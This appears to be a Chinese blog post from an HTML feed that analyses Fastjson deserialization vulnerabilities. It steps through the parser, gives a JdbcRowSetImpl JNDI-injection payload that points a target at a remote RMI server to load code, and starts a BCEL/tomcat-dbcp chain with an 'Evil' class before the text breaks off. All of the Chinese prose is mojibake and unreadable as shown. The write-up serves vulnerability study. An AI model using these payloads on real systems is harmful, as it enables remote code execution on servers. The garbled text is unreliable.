        <content type="html"><![CDATA[<h2 id="Fastjsonå›é¡¾"><a href="#Fastjsonå›é¡¾" class="headerlink" title="Fastjsonå›é¡¾"></a>Fastjsonå›é¡¾</h2><p>è¿™é‡Œå…ˆæ¥å›é¡¾ä¸€ä¸‹fastjsonæ€ä¹ˆä½¿ç”¨ï¼Œå…¶å®ç ”ç©¶å…·ä½“çš„æ¼æ´ä¸»è¦å°±æ˜¯fastjsonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><p>å…ˆæ¥åˆ›å»ºä¸€ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚æ„é€ &quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set age&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get id&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set id&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¼€å§‹å®éªŒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//å°†ä¸€ä¸ªjavaå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">22</span>, <span class="number">123456</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(ocean);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        <span class="comment">//å°†ä¸€ä¸ªjsonå­—ç¬¦ä¼ ååºåˆ—åŒ–ä¸º javaå¯¹è±¡</span></span><br><span class="line">        <span class="comment">//jsonå­—ç¬¦ä¸²è¿˜åŸä½å¯¹è±¡çš„ä¸¤ç§æ–¹æ³•ï¼š</span></span><br><span class="line">        <span class="comment">//è¿™é‡Œä½¿ç”¨parseä¼šå°†jsonstringååºåˆ—åŒ–æˆjsonå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">        System.out.println(parse.getClass().getName());</span><br><span class="line">        <span class="comment">//è¿™é‡Œä½¿ç”¨paseObjectä¼šå°†jsonstringååºåˆ—åŒ–æˆjsonå¯¹è±¡</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(jsonObject.getClass().getName());</span><br><span class="line">        <span class="comment">//ä½¿ç”¨parseObjectå°†jsonå­—ç¬¦ä¸²åå­¦åˆ—åŒ–æˆæŒ‡å®šçš„javaå¯¹è±¡</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬ååºåˆ—åŒ–æ—¶ä¸æŒ‡å®šç‰¹å®šçš„ç±»ï¼Œé‚£ä¹ˆFastjosnå°±é»˜è®¤å°†ä¸€ä¸ªJSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªJSONObjectã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºç±»ä¸­<code>private</code>ç±»å‹çš„å±æ€§å€¼ï¼ŒFastjsoné»˜è®¤ä¸ä¼šå°†å…¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><h3 id="Fastjsonä¸­çš„-type"><a href="#Fastjsonä¸­çš„-type" class="headerlink" title="Fastjsonä¸­çš„@type"></a>Fastjsonä¸­çš„@type</h3><p>å½“æˆ‘ä»¬åœ¨ä½¿ç”¨Fastjsonåºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œå¦‚æœ<code>toJSONString()</code>æ–¹æ³•ä¸æ·»åŠ é¢å¤–çš„å±æ€§ï¼Œé‚£ä¹ˆå°±ä¼šå°†ä¸€ä¸ªJava Beanè½¬æ¢æˆJSONå­—ç¬¦ä¸²ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466117349-36488218-a102-4b40-93ed-5c71dbae14d5.png"></p><p>å¦‚æœæˆ‘ä»¬æƒ³æŠŠJSONå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJava Objectï¼Œå¯ä»¥ä½¿ç”¨<code>parse()</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•é»˜è®¤å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªJSONObjectå¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466153949-5ccdff26-322d-406b-a4a2-0015e21f0b90.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºåŸå§‹çš„ç±»å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•</p><p>ç¬¬ä¸€ç§æ˜¯åºåˆ—åŒ–çš„æ—¶å€™ï¼Œåœ¨<code>toJSONString()</code>æ–¹æ³•ä¸­æ·»åŠ é¢å¤–çš„å±æ€§<code>SerializerFeature._WriteClassName_</code>ï¼Œå°†å¯¹è±¡ç±»å‹ä¸€å¹¶åºåˆ—åŒ–ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> JSON.toJSONString(ocean, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(jsonString1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ocean.User&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;id&quot;</span>:<span class="number">123456</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ååºåˆ—åŒ–æ—¶parseå°±ä¼šæ ¹æ®@typeæ ‡è¯†å°†å…¶è½¬æ¢ä¸ºåŸæ¥çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parse(jsonString1);</span><br><span class="line">System.out.println(parse1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466349987-aeb5392d-ca6a-42d9-aa7b-d72ef65e554b.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ å’Œsetæ–¹æ³•</p><p>å†æ¥çœ‹çœ‹parseObjectæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> JSON.parseObject(jsonString1);</span><br><span class="line">System.out.println(jsonObject1);</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466454167-11d687cb-74f7-40b5-9903-502959a397d5.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸ä»…ä¼šè°ƒç”¨æ— å‚æ„é€ è¿˜ä¼šè°ƒç”¨setå’Œgetæ–¹æ³•ï¼Œè¿™å°±æ˜¯ä»–ä»¬çš„åŒºåˆ«ã€‚æ€»ç»“ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jsonå­—ç¬¦ä¸²è¿˜åŸä½å¯¹è±¡çš„ä¸¤ç§æ–¹æ³•ï¼š</span><br><span class="line"><span class="comment">//parseååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parse(jsonString1);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        <span class="comment">//parseObjectååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> JSON.parseObject(jsonString1);</span><br><span class="line">        System.out.println(jsonObject1);</span><br><span class="line"></span><br><span class="line">åŒºåˆ«åœ¨äºparseæ–¹æ³•åœ¨è°ƒç”¨æ—¶ä¼šè°ƒç”¨setæ–¹æ³•</span><br><span class="line">parseObjectåœ¨è°ƒç”¨æ—¶ä¼šè°ƒç”¨set getæ–¹æ³•</span><br><span class="line">è·Ÿè¿›çœ‹çœ‹</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>è¿™é‡Œè®°å½•ä¸€ä¸‹æ¼æ´åŸç†æºç è°ƒè¯•åˆ†æä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466977271-a0140f96-a6df-4436-8142-bf06f8a1b1f8.png"></p><p>åœ¨è¿›è¡Œparseçš„æ—¶å€™ä¼šé‡è½½ï¼Œç„¶ååœ¨è¿›åˆ¤æ–­æ˜¯å¦ä¸ºç©ºä¸ä¸ºç©ºå°±ç»§ç»­æ‰§è¡Œï¼Œè·Ÿåˆ°DefaultJSONParseré‡Œé¢çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467123617-e7b8a4d0-5b62-491c-b01a-9b2161ed46e7.png"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467140333-52313f53-9640-43d2-a4c1-6af65e50f393.png"></p><p>åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯<code>&#123;</code>å¦‚æœæ˜¯ï¼Œå°±æŠŠtokenè®¾ç½®ä¸º12 ï¼Œä¸æ˜¯å°±æ˜¯14</p><p>èµ°å®Œè¿™é‡Œå›æº¯åˆ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467458752-96a052ca-db70-49ef-91f5-4a39eab29802.png"></p><p>è·Ÿåˆ°è¿™ä¸ªparseæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467524674-9ffaa2de-d017-4200-8761-31c5a8c05c87.png"></p><p>è·Ÿè¿›parseObjecté‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467904378-19915852-6ce1-4b87-8036-df86c37ebdc2.png"></p><p>è¿™é‡Œè¿™ä¸ªæ–¹æ³•ä¼šè·å–è¿”å›@typeçš„è¿™ä¸ªå­—ç¬¦ä¸²</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467989039-b604f9da-81d8-4b29-8d97-1613a8d4fd4b.png"></p><p>èµ°åˆ°ä¸‹é¢ä¼šå‘ç°åˆè°ƒç”¨äº†scanSymbolæ–¹æ³•ä¼šè¿”å›@typeçš„å€¼ä¹Ÿå°±æ˜¯è¦ååºåˆ—åŒ–çš„ç±»ï¼Œç„¶åä¼šè°ƒç”¨loadclasså»åŠ è½½@typeæŒ‡å®šçš„ç±»ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733468849841-e7621543-dc9a-42fc-859b-db2112b95845.png"></p><p>å¾€ä¸‹èµ°è·Ÿåˆ°è¿™é‡Œè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733468861014-e4b36640-3a07-4b75-8d38-9b19331e8791.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733469088361-5fc1a5de-a4a2-4401-8247-4ff8c0a16792.png"></p><p>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733469154393-aeac64b2-ac0f-4ab2-bdf0-a9b9048f0777.png"></p><p>åˆ°è¿™é‡Œä¼šå»buildé‡Œé¢é€šè¿‡åå°„æŸ¥æ‰¾get setæ–¹æ³•ã€‚æ‰€ä»¥è¿™é‡Œå¼•ç”¨åˆ«äººçš„æ€»ç»“</p><p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬æŒ‡å®š<code>@type</code>ä¸ºæ¶æ„ç±»æ—¶ï¼Œå¹¶ä¸”å…¶getter&#x2F;setteræœ‰ç€ä¸€å®šå±å®³æ—¶ï¼Œå°±ä¼šå‡ºç°æ— æ³•é¢„ä¼°çš„å±å®³ï¼Œé‡ç‚¹å°±åœ¨äºå…¶ä¼šè‡ªåŠ¨æ‰§è¡Œgetter&#x2F;setterï¼Œç®€å•çš„æ¥è§£é‡Šä¸‹åŸç†å°±æ˜¯é€šè¿‡åå°„è°ƒç”¨getæ–¹æ³•è·å–å€¼ï¼Œç›¸åº”çš„å°±æ˜¯é€šè¿‡åå°„è°ƒç”¨setæ–¹æ³•å­˜å‚¨å€¼ï¼Œå…¶ä¸­getterè‡ªåŠ¨è°ƒç”¨è¿˜éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>æ–¹æ³•åé•¿åº¦å¤§äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°ä¼ å…¥</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>setterè‡ªåŠ¨è°ƒç”¨éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>æ–¹æ³•åé•¿åº¦å¤§äº4</li><li>éé™æ€æ–¹æ³•</li><li>è¿”å›å€¼ä¸ºvoidæˆ–è€…å½“å‰ç±»</li><li>ä»¥setå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>é™¤æ­¤ä¹‹å¤–Fastjsonè¿˜æœ‰ä»¥ä¸‹åŠŸèƒ½ç‚¹ï¼š</p><ol><li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰setteræ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨<code>Feature.SupportNonPublicField</code>å‚æ•°</li><li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾getter&#x2F;setteræ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•°<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>æ–¹æ³•ï¼Œä¼šå¿½ç•¥<code>_ -</code>å­—ç¬¦ä¸²</li><li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœFieldç±»å‹ä¸ºbyte[]ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>è¿›è¡Œbase64è§£ç ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œbase64ç¼–ç </li></ol><h2 id="fastjson1-2-24"><a href="#fastjson1-2-24" class="headerlink" title="fastjson1.2.24"></a>fastjson1.2.24</h2><h3 id="JdbcRowSetImplåˆ©ç”¨é“¾"><a href="#JdbcRowSetImplåˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImplåˆ©ç”¨é“¾"></a>JdbcRowSetImplåˆ©ç”¨é“¾</h3><p>è¿™é‡Œç›´æ¥çœ‹èµ·æ¼æ´ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733472238279-f48c9dd3-c1c1-4903-b82a-ed6720de020b.png"></p><p>æ˜¯è¿™ä¸ªsetæ–¹æ³•å‰é¢è¯´setteræ–¹æ³•è‡ªåŠ¨è°ƒç”¨çš„åˆ©ç”¨æ¡ä»¶è¿™é‡Œéƒ½æ»¡è¶³äº†ï¼Œè¿™é‡Œconnå¦‚æœæ˜¯ç©ºçš„è¯å°±ä¼šè°ƒç”¨connectæ–¹æ³•è·Ÿåˆ°connectæ–¹æ³•é‡Œçœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733472324158-fa32ee6b-a492-4b3a-8708-04264806c600.png">çœ‹åˆ°æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„jndiæ³¨å…¥ã€‚å¹¶ä¸”datasourcenameå¯æ§</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥å†™payloadäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://10.169.5.52:1099/kyesra&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¡é“¾æœ‰ç‰ˆæœ¬ã€ä¾èµ–ã€å‡ºç½‘é™åˆ¶</p><h2 id="Fastjsonä¸å‡ºç½‘"><a href="#Fastjsonä¸å‡ºç½‘" class="headerlink" title="Fastjsonä¸å‡ºç½‘"></a>Fastjsonä¸å‡ºç½‘</h2><h3 id="BCElé“¾"><a href="#BCElé“¾" class="headerlink" title="BCElé“¾"></a>BCElé“¾</h3><p>bcelå…·ä½“åŸç†å’Œç”¨æ³•å‚è€ƒ<a href="https://www.yuque.com/zqiangweihuakai/ybltae/qlir1pya36gtghqn">java åŠ¨æ€åŠ è½½å­—èŠ‚ç </a>ï¼Œé‡Œé¢æœ‰ä»‹ç»è¿™é‡Œæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•ç»“åˆfastjsonè¿›è¡Œåˆ©ç”¨ã€‚</p><p>è¿™æ¡é“¾çš„åˆ©ç”¨éœ€è¦ç»“åˆtomcat-dbcpä¾èµ–æ¥çœ‹ä¸€ä¸‹å…·ä½“çš„å…³é”®ç‚¹ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†BasicDataSourceè¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476586441-ecc99782-d92e-43bf-afe4-a0d532ee0daf.png"></p><p>è¿™ä¸ªç±»é‡Œé¢æœ‰ä¸€ä¸ªcreateConnectionFactoryæ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†Class.forName,è¿™ä¸ªæˆ‘ä»¬çŸ¥é“åº•å±‚ä¹Ÿæ˜¯è°ƒç”¨çš„loadclassæ–¹æ³•å»åŠ è½½ç±»ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹è¿™ä¸ªæ–¹æ³•é‡Œçš„é€»è¾‘ï¼Œå¦‚æœdriverClassLoaderä¸æ˜¯ç©ºçš„è¯å°±ä¼šè°ƒç”¨è¿™ä¸ªforNameï¼ŒåŠ è½½driverClassNameï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœèƒ½å°†è¿™ä¸ªå±æ€§æ”¹ä¸ºbcelçš„æ¶æ„çš„classnameé‚£ä¹ˆå°±å¯ä»¥è§¦å‘æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸€ä¸ªsetæ–¹æ³•å¯ä»¥æ‰¾åˆ°å…¶å®æ˜¯æœ‰çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476926393-a5b2a108-67cd-4c9d-9dce-73943f492615.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476953544-1a325ad1-e3e5-497c-bb3a-61c2c7d3084c.png"></p><p>é‚£ä¹ˆç°åœ¨å°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªget setæ–¹æ³•åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­èƒ½å¤Ÿè§¦å‘createConnectionFactoryæ–¹æ³•è¿™é‡Œä¹Ÿæ˜¯æœ‰çš„</p><p>å¯ä»¥æ‰¾åˆ°<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733477249817-f1188ed2-2437-4168-9278-3df5a28d49fb.png"></p><p>è¿™ä¸ªç±»é‡Œæœ‰getconnectionæ–¹æ³•ï¼Œæœ€åä¼šè°ƒç”¨createDataSourceæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733477309602-528a4833-3c88-4ac4-b318-eb79328c720b.png"></p><p>è¿™é‡Œåˆè°ƒç”¨äº†createConnectionFactoryæ‰€ä»¥è¿™æ¡åˆ©ç”¨é“¾å°±å®Œæ•´äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span><span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 